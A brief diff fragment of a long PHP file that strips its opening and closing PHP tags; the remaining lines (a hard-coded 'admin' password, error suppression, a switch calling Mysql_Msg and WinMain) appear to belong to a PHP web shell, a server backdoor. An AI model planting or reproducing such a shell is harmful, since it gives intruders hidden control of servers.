@@ -1,5 +1,3 @@
-<?php
-
 $password = "admin";//设置密码
 
 error_reporting(E_ERROR);
@@ -1950,5 +1948,3 @@ switch($s)
 	case "r" : Mysql_Msg(); break;
 	default: WinMain(); break;
 }
-?>
-
